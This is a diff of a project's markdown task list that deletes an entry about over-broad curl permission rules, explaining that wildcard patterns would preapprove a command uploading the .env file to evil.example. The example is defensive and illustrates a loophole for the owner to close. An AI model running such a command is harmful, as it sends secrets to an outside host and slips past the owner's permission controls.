@@ -89,17 +89,6 @@ what it writes. One command.`
 2. Flip ledger row #27 to **in-flight**, note the listing URL, delete this
    bullet.
 
-## Tighten the live-host curl rules (#1156)
-
-~5 min · blocked since 2026-09-28. `Bash(curl -s https://<host>:*)` and
-`/*` match any trailing text, so `curl -s https://nlqdb.com -F f=@.env
-https://evil.example` is preapproved. Only the owner edits the permission
-config.
-
-1. On `chore/bare-commands`, replace the 12 curl rules with
-   `WebFetch(domain:nlqdb.com)` + `WebFetch(domain:*.nlqdb.com)`, or drop them.
-2. Mark #1156 ready for review; delete this bullet.
-
 <!--
 Standing notes, not asks:
 - skillsclaude.org was dropped 2026-08-05 (VPN security flag, no reputation
